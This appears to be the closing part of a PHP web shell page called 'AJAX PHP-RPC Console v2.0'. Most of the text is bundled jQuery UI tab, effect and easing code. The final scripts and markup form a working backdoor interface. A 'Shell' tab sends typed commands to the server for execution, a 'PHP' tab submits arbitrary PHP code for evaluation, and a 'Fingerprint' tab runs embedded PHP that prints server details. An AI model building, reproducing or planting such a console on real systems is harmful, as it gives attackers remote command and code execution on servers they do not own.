self.$panels=self.$panels.add(a.hash);else if($(a).attr('href')!='#'){$.data(a,'href.tabs',a.href);$.data(a,'load.tabs',a.href);var id=self.tabId(a);a.href='#'+id;var $panel=$('#'+id);if(!$panel.length){$panel=$(o.panelTemplate).attr('id',id).addClass(o.panelClass).insertAfter(self.$panels[i-1]||self.element);$panel.data('destroy.tabs',true);}
self.$panels=self.$panels.add($panel);}
else
o.disabled.push(i+1);});if(init){this.element.addClass(o.navClass);this.$panels.each(function(){var $this=$(this);$this.addClass(o.panelClass);});if(o.selected===undefined){if(location.hash){this.$tabs.each(function(i,a){if(a.hash==location.hash){o.selected=i;if($.browser.msie||$.browser.opera){var $toShow=$(location.hash),toShowId=$toShow.attr('id');$toShow.attr('id','');setTimeout(function(){$toShow.attr('id',toShowId);},500);}
scrollTo(0,0);return false;}});}
else if(o.cookie){var index=parseInt($.cookie('ui-tabs'+$.data(self.element)),10);if(index&&self.$tabs[index])
o.selected=index;}
else if(self.$lis.filter('.'+o.selectedClass).length)
o.selected=self.$lis.index(self.$lis.filter('.'+o.selectedClass)[0]);}
o.selected=o.selected===null||o.selected!==undefined?o.selected:0;o.disabled=$.unique(o.disabled.concat($.map(this.$lis.filter('.'+o.disabledClass),function(n,i){return self.$lis.index(n);}))).sort();if($.inArray(o.selected,o.disabled)!=-1)
o.disabled.splice($.inArray(o.selected,o.disabled),1);this.$panels.addClass(o.hideClass);this.$lis.removeClass(o.selectedClass);if(o.selected!==null){this.$panels.eq(o.selected).show().removeClass(o.hideClass);this.$lis.eq(o.selected).addClass(o.selectedClass);var onShow=function(){$(self.element).triggerHandler('tabsshow',[self.fakeEvent('tabsshow'),self.ui(self.$tabs[o.selected],self.$panels[o.selected])],o.show);};if($.data(this.$tabs[o.selected],'load.tabs'))
this.load(o.selected,onShow);else
onShow();}
$(window).bind('unload',function(){self.$tabs.unbind('.tabs');self.$lis=self.$tabs=self.$panels=null;});}
for(var i=0,li;li=this.$lis[i];i++)
$(li)[$.inArray(i,o.disabled)!=-1&&!$(li).hasClass(o.selectedClass)?'addClass':'removeClass'](o.disabledClass);if(o.cache===false)
this.$tabs.removeData('cache.tabs');var hideFx,showFx,baseFx={'min-width':0,duration:1},baseDuration='normal';if(o.fx&&o.fx.constructor==Array)
hideFx=o.fx[0]||baseFx,showFx=o.fx[1]||baseFx;else
hideFx=showFx=o.fx||baseFx;var resetCSS={display:'',overflow:'',height:''};if(!$.browser.msie)
resetCSS.opacity='';function hideTab(clicked,$hide,$show){$hide.animate(hideFx,hideFx.duration||baseDuration,function(){$hide.addClass(o.hideClass).css(resetCSS);if($.browser.msie&&hideFx.opacity)
$hide[0].style.filter='';if($show)
showTab(clicked,$show,$hide);});}
function showTab(clicked,$show,$hide){if(showFx===baseFx)
$show.css('display','block');$show.animate(showFx,showFx.duration||baseDuration,function(){$show.removeClass(o.hideClass).css(resetCSS);if($.browser.msie&&showFx.opacity)
$show[0].style.filter='';$(self.element).triggerHandler('tabsshow',[self.fakeEvent('tabsshow'),self.ui(clicked,$show[0])],o.show);});}
function switchTab(clicked,$li,$hide,$show){$li.addClass(o.selectedClass).siblings().removeClass(o.selectedClass);hideTab(clicked,$hide,$show);}
this.$tabs.unbind('.tabs').bind(o.event,function(){var $li=$(this).parents('li:eq(0)'),$hide=self.$panels.filter(':visible'),$show=$(this.hash);if(($li.hasClass(o.selectedClass)&&!o.unselect)||$li.hasClass(o.disabledClass)||$(this).hasClass(o.loadingClass)||$(self.element).triggerHandler('tabsselect',[self.fakeEvent('tabsselect'),self.ui(this,$show[0])],o.select)===false){this.blur();return false;}
self.options.selected=self.$tabs.index(this);if(o.unselect){if($li.hasClass(o.selectedClass)){self.options.selected=null;$li.removeClass(o.selectedClass);self.$panels.stop();hideTab(this,$hide);this.blur();return false;}else if(!$hide.length){self.$panels.stop();var a=this;self.load(self.$tabs.index(this),function(){$li.addClass(o.selectedClass).addClass(o.unselectClass);showTab(a,$show);});this.blur();return false;}}
if(o.cookie)
$.cookie('ui-tabs'+$.data(self.element),self.options.selected,o.cookie);self.$panels.stop();if($show.length){var a=this;self.load(self.$tabs.index(this),$hide.length?function(){switchTab(a,$li,$hide,$show);}:function(){$li.addClass(o.selectedClass);showTab(a,$show);});}else
throw'jQuery UI Tabs: Mismatching fragment identifier.';if($.browser.msie)
this.blur();return false;});if(!(/^click/).test(o.event))
this.$tabs.bind('click.tabs',function(){return false;});},add:function(url,label,index){if(index==undefined)
index=this.$tabs.length;var o=this.options;var $li=$(o.tabTemplate.replace(/#\{href\}/g,url).replace(/#\{label\}/g,label));$li.data('destroy.tabs',true);var id=url.indexOf('#')==0?url.replace('#',''):this.tabId($('a:first-child',$li)[0]);var $panel=$('#'+id);if(!$panel.length){$panel=$(o.panelTemplate).attr('id',id).addClass(o.hideClass).data('destroy.tabs',true);}
$panel.addClass(o.panelClass);if(index>=this.$lis.length){$li.appendTo(this.element);$panel.appendTo(this.element[0].parentNode);}else{$li.insertBefore(this.$lis[index]);$panel.insertBefore(this.$panels[index]);}
o.disabled=$.map(o.disabled,function(n,i){return n>=index?++n:n});this.tabify();if(this.$tabs.length==1){$li.addClass(o.selectedClass);$panel.removeClass(o.hideClass);var href=$.data(this.$tabs[0],'load.tabs');if(href)
this.load(index,href);}
this.element.triggerHandler('tabsadd',[this.fakeEvent('tabsadd'),this.ui(this.$tabs[index],this.$panels[index])],o.add);},remove:function(index){var o=this.options,$li=this.$lis.eq(index).remove(),$panel=this.$panels.eq(index).remove();if($li.hasClass(o.selectedClass)&&this.$tabs.length>1)
this.select(index+(index+1<this.$tabs.length?1:-1));o.disabled=$.map($.grep(o.disabled,function(n,i){return n!=index;}),function(n,i){return n>=index?--n:n});this.tabify();this.element.triggerHandler('tabsremove',[this.fakeEvent('tabsremove'),this.ui($li.find('a')[0],$panel[0])],o.remove);},enable:function(index){var o=this.options;if($.inArray(index,o.disabled)==-1)
return;var $li=this.$lis.eq(index).removeClass(o.disabledClass);if($.browser.safari){$li.css('display','inline-block');setTimeout(function(){$li.css('display','block');},0);}
o.disabled=$.grep(o.disabled,function(n,i){return n!=index;});this.element.triggerHandler('tabsenable',[this.fakeEvent('tabsenable'),this.ui(this.$tabs[index],this.$panels[index])],o.enable);},disable:function(index){var self=this,o=this.options;if(index!=o.selected){this.$lis.eq(index).addClass(o.disabledClass);o.disabled.push(index);o.disabled.sort();this.element.triggerHandler('tabsdisable',[this.fakeEvent('tabsdisable'),this.ui(this.$tabs[index],this.$panels[index])],o.disable);}},select:function(index){if(typeof index=='string')
index=this.$tabs.index(this.$tabs.filter('[href$='+index+']')[0]);this.$tabs.eq(index).trigger(this.options.event);},load:function(index,callback){var self=this,o=this.options,$a=this.$tabs.eq(index),a=$a[0],bypassCache=callback==undefined||callback===false,url=$a.data('load.tabs');callback=callback||function(){};if(!url||!bypassCache&&$.data(a,'cache.tabs')){callback();return;}
var inner=function(parent){var $parent=$(parent),$inner=$parent.find('*:last');return $inner.length&&$inner.is(':not(img)')&&$inner||$parent;};var cleanup=function(){self.$tabs.filter('.'+o.loadingClass).removeClass(o.loadingClass).each(function(){if(o.spinner)
inner(this).parent().html(inner(this).data('label.tabs'));});self.xhr=null;};if(o.spinner){var label=inner(a).html();inner(a).wrapInner('<em></em>').find('em').data('label.tabs',label).html(o.spinner);}
var ajaxOptions=$.extend({},o.ajaxOptions,{url:url,success:function(r,s){$(a.hash).html(r);cleanup();if(o.cache)
$.data(a,'cache.tabs',true);$(self.element).triggerHandler('tabsload',[self.fakeEvent('tabsload'),self.ui(self.$tabs[index],self.$panels[index])],o.load);o.ajaxOptions.success&&o.ajaxOptions.success(r,s);callback();}});if(this.xhr){this.xhr.abort();cleanup();}
$a.addClass(o.loadingClass);setTimeout(function(){self.xhr=$.ajax(ajaxOptions);},0);},url:function(index,url){this.$tabs.eq(index).removeData('cache.tabs').data('load.tabs',url);},destroy:function(){var o=this.options;this.element.unbind('.tabs').removeClass(o.navClass).removeData('tabs');this.$tabs.each(function(){var href=$.data(this,'href.tabs');if(href)
this.href=href;var $this=$(this).unbind('.tabs');$.each(['href','load','cache'],function(i,prefix){$this.removeData(prefix+'.tabs');});});this.$lis.add(this.$panels).each(function(){if($.data(this,'destroy.tabs'))
$(this).remove();else
$(this).removeClass([o.selectedClass,o.unselectClass,o.disabledClass,o.panelClass,o.hideClass].join(' '));});},fakeEvent:function(type){return $.event.fix({type:type,target:this.element[0]});}});$.ui.tabs.defaults={unselect:false,event:'click',disabled:[],cookie:null,spinner:'Loading&#8230;',cache:false,idPrefix:'ui-tabs-',ajaxOptions:{},fx:null,tabTemplate:'<li><a href="#{href}"><span>#{label}</span></a></li>',panelTemplate:'<div></div>',navClass:'ui-tabs-nav',selectedClass:'ui-tabs-selected',unselectClass:'ui-tabs-unselect',disabledClass:'ui-tabs-disabled',panelClass:'ui-tabs-panel',hideClass:'ui-tabs-hide',loadingClass:'ui-tabs-loading'};$.ui.tabs.getter="length";$.extend($.ui.tabs.prototype,{rotation:null,rotate:function(ms,continuing){continuing=continuing||false;var self=this,t=this.options.selected;function start(){self.rotation=setInterval(function(){t=++t<self.$tabs.length?t:0;self.select(t);},ms);}
function stop(e){if(!e||e.clientX){clearInterval(self.rotation);}}
if(ms){start();if(!continuing)
this.$tabs.bind(this.options.event,stop);else
this.$tabs.bind(this.options.event,function(){stop();t=self.options.selected;start();});}
else{stop();this.$tabs.unbind(this.options.event,stop);}}});})(jQuery);;(function($){$.effects=$.effects||{};$.extend($.effects,{save:function(el,set){for(var i=0;i<set.length;i++){if(set[i]!==null)$.data(el[0],"ec.storage."+set[i],el[0].style[set[i]]);}},restore:function(el,set){for(var i=0;i<set.length;i++){if(set[i]!==null)el.css(set[i],$.data(el[0],"ec.storage."+set[i]));}},setMode:function(el,mode){if(mode=='toggle')mode=el.is(':hidden')?'show':'hide';return mode;},getBaseline:function(origin,original){var y,x;switch(origin[0]){case'top':y=0;break;case'middle':y=0.5;break;case'bottom':y=1;break;default:y=origin[0]/original.height;};switch(origin[1]){case'left':x=0;break;case'center':x=0.5;break;case'right':x=1;break;default:x=origin[1]/original.width;};return{x:x,y:y};},createWrapper:function(el){if(el.parent().attr('id')=='fxWrapper')
return el;var props={width:el.outerWidth({margin:true}),height:el.outerHeight({margin:true}),'float':el.css('float')};el.wrap('<div id="fxWrapper" style="font-size:100%;background:transparent;border:none;margin:0;padding:0"></div>');var wrapper=el.parent();if(el.css('position')=='static'){wrapper.css({position:'relative'});el.css({position:'relative'});}else{var top=el.css('top');if(isNaN(parseInt(top)))top='auto';var left=el.css('left');if(isNaN(parseInt(left)))left='auto';wrapper.css({position:el.css('position'),top:top,left:left,zIndex:el.css('z-index')}).show();el.css({position:'relative',top:0,left:0});}
wrapper.css(props);return wrapper;},removeWrapper:function(el){if(el.parent().attr('id')=='fxWrapper')
return el.parent().replaceWith(el);return el;},setTransition:function(el,list,factor,val){val=val||{};$.each(list,function(i,x){unit=el.cssUnit(x);if(unit[0]>0)val[x]=unit[0]*factor+unit[1];});return val;},animateClass:function(value,duration,easing,callback){var cb=(typeof easing=="function"?easing:(callback?callback:null));var ea=(typeof easing=="object"?easing:null);return this.each(function(){var offset={};var that=$(this);var oldStyleAttr=that.attr("style")||'';if(typeof oldStyleAttr=='object')oldStyleAttr=oldStyleAttr["cssText"];if(value.toggle){that.hasClass(value.toggle)?value.remove=value.toggle:value.add=value.toggle;}
var oldStyle=$.extend({},(document.defaultView?document.defaultView.getComputedStyle(this,null):this.currentStyle));if(value.add)that.addClass(value.add);if(value.remove)that.removeClass(value.remove);var newStyle=$.extend({},(document.defaultView?document.defaultView.getComputedStyle(this,null):this.currentStyle));if(value.add)that.removeClass(value.add);if(value.remove)that.addClass(value.remove);for(var n in newStyle){if(typeof newStyle[n]!="function"&&newStyle[n]&&n.indexOf("Moz")==-1&&n.indexOf("length")==-1&&newStyle[n]!=oldStyle[n]&&(n.match(/color/i)||(!n.match(/color/i)&&!isNaN(parseInt(newStyle[n],10))))&&(oldStyle.position!="static"||(oldStyle.position=="static"&&!n.match(/left|top|bottom|right/))))offset[n]=newStyle[n];}
that.animate(offset,duration,ea,function(){if(typeof $(this).attr("style")=='object'){$(this).attr("style")["cssText"]="";$(this).attr("style")["cssText"]=oldStyleAttr;}else $(this).attr("style",oldStyleAttr);if(value.add)$(this).addClass(value.add);if(value.remove)$(this).removeClass(value.remove);if(cb)cb.apply(this,arguments);});});}});$.fn.extend({_show:$.fn.show,_hide:$.fn.hide,__toggle:$.fn.toggle,_addClass:$.fn.addClass,_removeClass:$.fn.removeClass,_toggleClass:$.fn.toggleClass,effect:function(fx,o,speed,callback){return $.effects[fx]?$.effects[fx].call(this,{method:fx,options:o||{},duration:speed,callback:callback}):null;},show:function(){if(!arguments[0]||(arguments[0].constructor==Number||/(slow|normal|fast)/.test(arguments[0])))
return this._show.apply(this,arguments);else{var o=arguments[1]||{};o['mode']='show';return this.effect.apply(this,[arguments[0],o,arguments[2]||o.duration,arguments[3]||o.callback]);}},hide:function(){if(!arguments[0]||(arguments[0].constructor==Number||/(slow|normal|fast)/.test(arguments[0])))
return this._hide.apply(this,arguments);else{var o=arguments[1]||{};o['mode']='hide';return this.effect.apply(this,[arguments[0],o,arguments[2]||o.duration,arguments[3]||o.callback]);}},toggle:function(){if(!arguments[0]||(arguments[0].constructor==Number||/(slow|normal|fast)/.test(arguments[0]))||(arguments[0].constructor==Function))
return this.__toggle.apply(this,arguments);else{var o=arguments[1]||{};o['mode']='toggle';return this.effect.apply(this,[arguments[0],o,arguments[2]||o.duration,arguments[3]||o.callback]);}},addClass:function(classNames,speed,easing,callback){return speed?$.effects.animateClass.apply(this,[{add:classNames},speed,easing,callback]):this._addClass(classNames);},removeClass:function(classNames,speed,easing,callback){return speed?$.effects.animateClass.apply(this,[{remove:classNames},speed,easing,callback]):this._removeClass(classNames);},toggleClass:function(classNames,speed,easing,callback){return speed?$.effects.animateClass.apply(this,[{toggle:classNames},speed,easing,callback]):this._toggleClass(classNames);},morph:function(remove,add,speed,easing,callback){return $.effects.animateClass.apply(this,[{add:add,remove:remove},speed,easing,callback]);},switchClass:function(){return this.morph.apply(this,arguments);},cssUnit:function(key){var style=this.css(key),val=[];$.each(['em','px','%','pt'],function(i,unit){if(style.indexOf(unit)>0)
val=[parseFloat(style),unit];});return val;}});jQuery.each(['backgroundColor','borderBottomColor','borderLeftColor','borderRightColor','borderTopColor','color','outlineColor'],function(i,attr){jQuery.fx.step[attr]=function(fx){if(fx.state==0){fx.start=getColor(fx.elem,attr);fx.end=getRGB(fx.end);}
fx.elem.style[attr]="rgb("+[Math.max(Math.min(parseInt((fx.pos*(fx.end[0]-fx.start[0]))+fx.start[0]),255),0),Math.max(Math.min(parseInt((fx.pos*(fx.end[1]-fx.start[1]))+fx.start[1]),255),0),Math.max(Math.min(parseInt((fx.pos*(fx.end[2]-fx.start[2]))+fx.start[2]),255),0)].join(",")+")";}});function getRGB(color){var result;if(color&&color.constructor==Array&&color.length==3)
return color;if(result=/rgb\(\s*([0-9]{1,3})\s*,\s*([0-9]{1,3})\s*,\s*([0-9]{1,3})\s*\)/.exec(color))
return[parseInt(result[1]),parseInt(result[2]),parseInt(result[3])];if(result=/rgb\(\s*([0-9]+(?:\.[0-9]+)?)\%\s*,\s*([0-9]+(?:\.[0-9]+)?)\%\s*,\s*([0-9]+(?:\.[0-9]+)?)\%\s*\)/.exec(color))
return[parseFloat(result[1])*2.55,parseFloat(result[2])*2.55,parseFloat(result[3])*2.55];if(result=/#([a-fA-F0-9]{2})([a-fA-F0-9]{2})([a-fA-F0-9]{2})/.exec(color))
return[parseInt(result[1],16),parseInt(result[2],16),parseInt(result[3],16)];if(result=/#([a-fA-F0-9])([a-fA-F0-9])([a-fA-F0-9])/.exec(color))
return[parseInt(result[1]+result[1],16),parseInt(result[2]+result[2],16),parseInt(result[3]+result[3],16)];if(result=/rgba\(0, 0, 0, 0\)/.exec(color))
return colors['transparent']
return colors[jQuery.trim(color).toLowerCase()];}
function getColor(elem,attr){var color;do{color=jQuery.curCSS(elem,attr);if(color!=''&&color!='transparent'||jQuery.nodeName(elem,"body"))
break;attr="backgroundColor";}while(elem=elem.parentNode);return getRGB(color);};var colors={aqua:[0,255,255],azure:[240,255,255],beige:[245,245,220],black:[0,0,0],blue:[0,0,255],brown:[165,42,42],cyan:[0,255,255],darkblue:[0,0,139],darkcyan:[0,139,139],darkgrey:[169,169,169],darkgreen:[0,100,0],darkkhaki:[189,183,107],darkmagenta:[139,0,139],darkolivegreen:[85,107,47],darkorange:[255,140,0],darkorchid:[153,50,204],darkred:[139,0,0],darksalmon:[233,150,122],darkviolet:[148,0,211],fuchsia:[255,0,255],gold:[255,215,0],green:[0,128,0],indigo:[75,0,130],khaki:[240,230,140],lightblue:[173,216,230],lightcyan:[224,255,255],lightgreen:[144,238,144],lightgrey:[211,211,211],lightpink:[255,182,193],lightyellow:[255,255,224],lime:[0,255,0],magenta:[255,0,255],maroon:[128,0,0],navy:[0,0,128],olive:[128,128,0],orange:[255,165,0],pink:[255,192,203],purple:[128,0,128],violet:[128,0,128],red:[255,0,0],silver:[192,192,192],white:[255,255,255],yellow:[255,255,0],transparent:[255,255,255]};jQuery.easing['jswing']=jQuery.easing['swing'];jQuery.extend(jQuery.easing,{def:'easeOutQuad',swing:function(x,t,b,c,d){return jQuery.easing[jQuery.easing.def](x,t,b,c,d);},easeInQuad:function(x,t,b,c,d){return c*(t/=d)*t+b;},easeOutQuad:function(x,t,b,c,d){return-c*(t/=d)*(t-2)+b;},easeInOutQuad:function(x,t,b,c,d){if((t/=d/2)<1)return c/2*t*t+b;return-c/2*((--t)*(t-2)-1)+b;},easeInCubic:function(x,t,b,c,d){return c*(t/=d)*t*t+b;},easeOutCubic:function(x,t,b,c,d){return c*((t=t/d-1)*t*t+1)+b;},easeInOutCubic:function(x,t,b,c,d){if((t/=d/2)<1)return c/2*t*t*t+b;return c/2*((t-=2)*t*t+2)+b;},easeInQuart:function(x,t,b,c,d){return c*(t/=d)*t*t*t+b;},easeOutQuart:function(x,t,b,c,d){return-c*((t=t/d-1)*t*t*t-1)+b;},easeInOutQuart:function(x,t,b,c,d){if((t/=d/2)<1)return c/2*t*t*t*t+b;return-c/2*((t-=2)*t*t*t-2)+b;},easeInQuint:function(x,t,b,c,d){return c*(t/=d)*t*t*t*t+b;},easeOutQuint:function(x,t,b,c,d){return c*((t=t/d-1)*t*t*t*t+1)+b;},easeInOutQuint:function(x,t,b,c,d){if((t/=d/2)<1)return c/2*t*t*t*t*t+b;return c/2*((t-=2)*t*t*t*t+2)+b;},easeInSine:function(x,t,b,c,d){return-c*Math.cos(t/d*(Math.PI/2))+c+b;},easeOutSine:function(x,t,b,c,d){return c*Math.sin(t/d*(Math.PI/2))+b;},easeInOutSine:function(x,t,b,c,d){return-c/2*(Math.cos(Math.PI*t/d)-1)+b;},easeInExpo:function(x,t,b,c,d){return(t==0)?b:c*Math.pow(2,10*(t/d-1))+b;},easeOutExpo:function(x,t,b,c,d){return(t==d)?b+c:c*(-Math.pow(2,-10*t/d)+1)+b;},easeInOutExpo:function(x,t,b,c,d){if(t==0)return b;if(t==d)return b+c;if((t/=d/2)<1)return c/2*Math.pow(2,10*(t-1))+b;return c/2*(-Math.pow(2,-10*--t)+2)+b;},easeInCirc:function(x,t,b,c,d){return-c*(Math.sqrt(1-(t/=d)*t)-1)+b;},easeOutCirc:function(x,t,b,c,d){return c*Math.sqrt(1-(t=t/d-1)*t)+b;},easeInOutCirc:function(x,t,b,c,d){if((t/=d/2)<1)return-c/2*(Math.sqrt(1-t*t)-1)+b;return c/2*(Math.sqrt(1-(t-=2)*t)+1)+b;},easeInElastic:function(x,t,b,c,d){var s=1.70158;var p=0;var a=c;if(t==0)return b;if((t/=d)==1)return b+c;if(!p)p=d*.3;if(a<Math.abs(c)){a=c;var s=p/4;}
else var s=p/(2*Math.PI)*Math.asin(c/a);return-(a*Math.pow(2,10*(t-=1))*Math.sin((t*d-s)*(2*Math.PI)/p))+b;},easeOutElastic:function(x,t,b,c,d){var s=1.70158;var p=0;var a=c;if(t==0)return b;if((t/=d)==1)return b+c;if(!p)p=d*.3;if(a<Math.abs(c)){a=c;var s=p/4;}
else var s=p/(2*Math.PI)*Math.asin(c/a);return a*Math.pow(2,-10*t)*Math.sin((t*d-s)*(2*Math.PI)/p)+c+b;},easeInOutElastic:function(x,t,b,c,d){var s=1.70158;var p=0;var a=c;if(t==0)return b;if((t/=d/2)==2)return b+c;if(!p)p=d*(.3*1.5);if(a<Math.abs(c)){a=c;var s=p/4;}
else var s=p/(2*Math.PI)*Math.asin(c/a);if(t<1)return-.5*(a*Math.pow(2,10*(t-=1))*Math.sin((t*d-s)*(2*Math.PI)/p))+b;return a*Math.pow(2,-10*(t-=1))*Math.sin((t*d-s)*(2*Math.PI)/p)*.5+c+b;},easeInBack:function(x,t,b,c,d,s){if(s==undefined)s=1.70158;return c*(t/=d)*t*((s+1)*t-s)+b;},easeOutBack:function(x,t,b,c,d,s){if(s==undefined)s=1.70158;return c*((t=t/d-1)*t*((s+1)*t+s)+1)+b;},easeInOutBack:function(x,t,b,c,d,s){if(s==undefined)s=1.70158;if((t/=d/2)<1)return c/2*(t*t*(((s*=(1.525))+1)*t-s))+b;return c/2*((t-=2)*t*(((s*=(1.525))+1)*t+s)+2)+b;},easeInBounce:function(x,t,b,c,d){return c-jQuery.easing.easeOutBounce(x,d-t,0,c,d)+b;},easeOutBounce:function(x,t,b,c,d){if((t/=d)<(1/2.75)){return c*(7.5625*t*t)+b;}else if(t<(2/2.75)){return c*(7.5625*(t-=(1.5/2.75))*t+.75)+b;}else if(t<(2.5/2.75)){return c*(7.5625*(t-=(2.25/2.75))*t+.9375)+b;}else{return c*(7.5625*(t-=(2.625/2.75))*t+.984375)+b;}},easeInOutBounce:function(x,t,b,c,d){if(t<d/2)return jQuery.easing.easeInBounce(x,t*2,0,c,d)*.5+b;return jQuery.easing.easeOutBounce(x,t*2-d,0,c,d)*.5+c*.5+b;}});})(jQuery);(function($){$.effects.blind=function(o){return this.queue(function(){var el=$(this),props=['position','top','left'];var mode=$.effects.setMode(el,o.options.mode||'hide');var direction=o.options.direction||'vertical';$.effects.save(el,props);el.show();var wrapper=$.effects.createWrapper(el).css({overflow:'hidden'});var ref=(direction=='vertical')?'height':'width';var distance=(direction=='vertical')?wrapper.height():wrapper.width();if(mode=='show')wrapper.css(ref,0);var animation={};animation[ref]=mode=='show'?distance:0;wrapper.animate(animation,o.duration,o.options.easing,function(){if(mode=='hide')el.hide();$.effects.restore(el,props);$.effects.removeWrapper(el);if(o.callback)o.callback.apply(el[0],arguments);el.dequeue();});});};})(jQuery);</script>
    <script type="text/javascript">
(function($){$.fn.terminal=function(callback){var obj=$(this);var output=$('<textarea></textarea><br />');var input=$('<input />');output.addClass('terminal_textarea');output.attr({cols:100,rows:25,readonly:true});input.addClass('terminal_textarea');input.attr({size:103,value:''});obj.append(output);obj.append(input);input.keypress(function(e){if(e.which==13)
{var data=$.trim(input.val());if(data.length>0)
{callback(data);}
input.val('');}});};$.fn.terminalFocus=function(){return this.each(function(){$("input.terminal_textarea",this).focus();});};$.fn.terminalClear=function(){return this.each(function(){$("textarea.terminal_textarea",this).val('');});};jQuery.fn.terminalPrint=function(message){return this.each(function(){var output=$("textarea.terminal_textarea",this);output.val(output.val()+message);output.attr('scrollTop',output.attr('scrollHeight'));});};jQuery.fn.terminalPrintLine=function(message){return this.terminalPrint(message+"\n");};})(jQuery);</script>
    <script type="text/javascript">
var PHP_RPC={Request:{encode:function(method,args){return base64.encode(MessagePack.pack({'name':method,'arguments':args,'state':PHP_RPC.state}));}},Response:{valid_types:{'error':true,'return':true},valid_keys:{'error':['message'],'return':['state','output']},decode:function(page){var extractor=new RegExp("<rpc-response>(.*)<\/rpc-response>");var match=page.match(extractor);if(match==null||match[1]==null||match[1].length==0)
{throw"PHP-RPC Response missing";}
var response=MessagePack.unpack(base64.decode(match[1]));if(response==null)
{throw"Invalid PHP-RPC Response";}
if(response['type']==null||!(response['type']in PHP_RPC.Response.valid_types))
{throw"Invalid PHP-RPC Response type";}
var check_keys=PHP_RPC.Response.valid_keys[response['type']];for(var i=0;i<check_keys.length;i++)
{if(response[check_keys[i]]==null)
{throw"PHP-RPC Response is missing the "+check_keys[i]+" key";}}
return response;}},serverURL:window.location.href,requestMethod:'GET',state:{},exceptionHandler:function(message){throw message;},callURL:function(method,args){var url=PHP_RPC.serverURL;if(url.indexOf('?')==-1)
{url+='?';}
else if(url[url.length-1]!='&')
{url+='&';}
var request=PHP_RPC.Request.encode(method,args);url+=('rpcrequest='+encodeURIComponent(request));return url;},call:function(method,args,callback){var url=PHP_RPC.callURL(method,args);jQuery.ajax({url:url,type:PHP_RPC.requestMethod,success:function(data){var response=PHP_RPC.Response.decode(data);if(response['type']=='error')
{PHP_RPC.exceptionHandler(response['message']);}
PHP_RPC.state=response['state'];callback(response);},error:function(xhr,type){PHP_RPC.exceptionHandler('The AJAX Request could not be completed ('+type+')');}});},callService:function(service,method,args,callback){PHP_RPC.call(service+'.'+method,args,callback);}};</script>
    <script type="text/javascript">
var UI={error:function(message){var mesg=$('<p class="exception"/>').text(message);mesg.insertBefore("input.terminal_textarea").hide();mesg.slideDown('slow').delay(3000).fadeOut('slow',mesg.remove);},Shell:{clear:function(){$("#console_shell").terminalClear();},print:function(message){$("#console_shell").terminalPrint(message);},exec:function(command){PHP_RPC.callService('shell','exec',new Array(command),function(output){var text='$ '+command+"\n";if(output.return_value!=null&&output.return_value.length>0)
{text+=output.return_value;}
UI.Shell.print(text);});}},PHP:{clear:function(){$("#console_php").terminalClear();},print:function(message){$("#console_php").terminalPrint(message);},inspect:function(code){PHP_RPC.callService('console','inspect',new Array(code),function(response){var text='>> '+code+"\n";if(response.output!=null)
{text+=response.output;}
UI.PHP.print(text+"=> "+response.return_value+"\n");});}}};</script>
    <script type="text/javascript">
      $(document).ready(function() {
        PHP_RPC.exceptionHandler = UI.error;

        $("#console_shell").terminal(function(input) {
          UI.Shell.exec(input);
        });

        $("#console_php").terminal(function(input) {
          UI.PHP.inspect(input);
        });

        $("#console_tabs > ul").tabs({
          fx: { height: 'toggle' },
          show: function(ui) {
            $("input", ui.panel).focus();
          }
        });
        $("#console_title").hide();

        $("#console_title").fadeIn(1300, function() {
          $("#console_shell").terminalFocus();
        });
      });
    </script>
  </head>

  <body>
    <div id="console_container">
      <h1 id="console_title">AJAX PHP-RPC Console v2.0</h1>

      <div id="console_content">
        <div id="console_tabs">
          <ul>
            <li><a href="#console_shell"><span>Shell</span></a></li>
            <li><a href="#console_php"><span>PHP</span></a></li>
            <li><a href="#console_fingerprint"><span>Fingerprint</span></a></li>
          </ul>

          <div id="console_shell" class="console_tab"></div>

          <div id="console_php" class="console_tab"></div>

          <div id="console_fingerprint" class="console_tab">
            <div class="console_dialogue">
              <!--
<?php
  echo(" -->");

  $info = fingerprint();

  foreach($info as $name => $value)
  {
    echo("<p><strong>" . str_replace('_', ' ', $name) . ":</strong> $value</p>\n");
  }

  echo("<!-- ");
?>
              -->
            </div>
          </div>
        </div>
      </div>
    </div>
  </body>
</html>
